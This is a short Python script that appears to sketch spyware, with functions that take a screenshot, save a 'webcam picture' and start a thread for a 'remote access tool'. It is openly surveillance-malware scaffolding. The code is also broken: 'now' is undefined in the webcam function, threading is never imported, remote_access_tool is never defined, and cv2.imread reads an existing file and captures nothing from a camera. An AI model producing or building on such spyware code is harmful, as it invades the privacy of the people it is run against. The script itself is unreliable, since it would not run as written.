import pyautogui
import time
import cv2

def take_screenshot():
    # Get the current time and date
    now = time.strftime("%Y-%m-%d_%H-%M-%S")

    # Save the screenshot to a file
    filename = now + ".png"
    pyautogui.screenshot(filename)

def take_webcam_picture():
    # Get a picture from the webcam
    image = cv2.imread("capture.jpg")

    # Save the picture to a file
    filename = now + ".jpg"
    cv2.imwrite(filename, image)

def add_remote_access_tool():
    # Create a new thread to run the remote access tool
    thread = threading.Thread(target=remote_access_tool)
    thread.start()

if __name__ == "__main__":
    take_screenshot()
    take_webcam_picture()
    add_remote_access_tool()
